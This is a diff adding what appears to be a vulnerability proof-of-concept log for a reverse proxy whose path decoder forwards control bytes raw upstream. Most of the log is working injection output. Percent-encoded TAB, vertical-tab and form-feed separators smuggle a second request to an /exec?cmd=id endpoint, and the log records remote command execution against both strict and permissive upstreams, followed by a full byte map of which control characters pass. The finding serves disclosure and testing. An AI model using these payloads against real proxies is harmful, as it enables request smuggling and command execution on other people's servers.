@@ -1,0 +1,97 @@
+build   : 3aeb255d3d7f__ae021893 (stage-05, release/000001)   config: proxy_prefix=/api/ + upstreams
+source  : line 51 parseheader() decode loop; forwarded at line 64 upstream() request-line build
+claim   : the decoded-path guard is ONLY 'if(ch==0||ch=='\\')return 400' — there is no c<32 test.
+          Every 0x01-0x1F and 0x7F byte reaches the upstream line RAW. With proxy_pass .../api/
+          the decoded path is concatenated onto 'GET ', so the injected separator is an extra
+          token. On an upstream that (a) splits the request line on whitespace and (b) validates
+          header lines, the CRLF form (SEC-001/002) is rejected at its orphaned ' HTTP/1.1' line
+          while TAB/VT/FF remain a single legal line and still execute — they are the variant
+          that survives a strict upstream. Payload uses /%61pi/ so the decoded branch is taken.
+
+=== 1. strict header-validating upstream: CRLF 400s, control-separator form executes ===
+
+--- CRLF %0d%0a  (SEC-001/002 form)
+upstream 1st line : b'GET /a'
+upstream head     : b'GET /a\r\nGET /exec?cmd=id HTTP/1.1\r\nHost: u\r\n HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
+status            : HTTP/1.1 400 Bad Request
+RCE               : False
+
+--- VT   %0b    (this finding)
+upstream 1st line : b'GET /exec\x0b?cmd=id HTTP/1.1'
+upstream head     : b'GET /exec\x0b?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
+status            : HTTP/1.1 200 OK
+RCE               : True
+
+--- FF   %0c    (this finding)
+upstream 1st line : b'GET /exec\x0c?cmd=id HTTP/1.1'
+upstream head     : b'GET /exec\x0c?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
+status            : HTTP/1.1 200 OK
+RCE               : True
+
+--- TAB  %09    (same class)
+upstream 1st line : b'GET /exec\t?cmd=id HTTP/1.1'
+upstream head     : b'GET /exec\t?cmd=id HTTP/1.1\r\nHost: 127.0.0.1:59623\r\nConnection: close\r\n\r\n'
+status            : HTTP/1.1 200 OK
+RCE               : True
+
+=== 2. permissive app.py router (split / unquote / exec): same four bytes ===
+
+RCE: True
+
+--- path %09 TAB
+upstream line: b'GET /exec\t?cmd=id HTTP/1.1'
+status: HTTP/1.1 200 OK
+RCE: True
+
+--- path %0b VT
+upstream line: b'GET /exec\x0b?cmd=id HTTP/1.1'
+status: HTTP/1.1 200 OK
+RCE: True
+
+--- path %0c FF
+upstream line: b'GET /exec\x0c?cmd=id HTTP/1.1'
+status: HTTP/1.1 200 OK
+RCE: True
+
+--- path %0d%0a CRLF (raw, for contrast)
+upstream line: b'GET /exec'
+status: HTTP/1.1 200 OK
+RCE: True
+
+=== 3. byte map: every decoded control byte held in the path, as literally seen upstream ===
+
+ byte name       front  on wire    note
+0x00             HTTP/  -          no upstream conn
+0x01             HTTP/  RAW        GET /a\x01b HTTP/1.1
+0x02             HTTP/  RAW        GET /a\x02b HTTP/1.1
+0x03             HTTP/  RAW        GET /a\x03b HTTP/1.1
+0x04             HTTP/  RAW        GET /a\x04b HTTP/1.1
+0x05             HTTP/  RAW        GET /a\x05b HTTP/1.1
+0x06             HTTP/  RAW        GET /a\x06b HTTP/1.1
+0x07             HTTP/  RAW        GET /a\x07b HTTP/1.1
+0x08             HTTP/  RAW        GET /a\x08b HTTP/1.1
+0x09             HTTP/  RAW        GET /a\tb HTTP/1.1
+0x0a             HTTP/  RAW        GET /a\nb HTTP/1.1
+0x0b             HTTP/  RAW        GET /a\x0bb HTTP/1.1
+0x0c             HTTP/  RAW        GET /a\x0cb HTTP/1.1
+0x0d             HTTP/  RAW        GET /a\rb HTTP/1.1
+0x0e             HTTP/  RAW        GET /a\x0eb HTTP/1.1
+0x0f             HTTP/  RAW        GET /a\x0fb HTTP/1.1
+0x10             HTTP/  RAW        GET /a\x10b HTTP/1.1
+0x11             HTTP/  RAW        GET /a\x11b HTTP/1.1
+0x12             HTTP/  RAW        GET /a\x12b HTTP/1.1
+0x13             HTTP/  RAW        GET /a\x13b HTTP/1.1
+0x14             HTTP/  RAW        GET /a\x14b HTTP/1.1
+0x15             HTTP/  RAW        GET /a\x15b HTTP/1.1
+0x16             HTTP/  RAW        GET /a\x16b HTTP/1.1
+0x17             HTTP/  RAW        GET /a\x17b HTTP/1.1
+0x18             HTTP/  RAW        GET /a\x18b HTTP/1.1
+0x19             HTTP/  RAW        GET /a\x19b HTTP/1.1
+0x1a             HTTP/  RAW        GET /a\x1ab HTTP/1.1
+0x1b             HTTP/  RAW        GET /a\x1bb HTTP/1.1
+0x1c             HTTP/  RAW        GET /a\x1cb HTTP/1.1
+0x1d             HTTP/  RAW        GET /a\x1db HTTP/1.1
+0x1e             HTTP/  RAW        GET /a\x1eb HTTP/1.1
+0x1f             HTTP/  RAW        GET /a\x1fb HTTP/1.1
+0x20             HTTP/  RAW        GET /a b HTTP/1.1
+0x7f             HTTP/  RAW        GET /a\x7fb HTTP/1.1
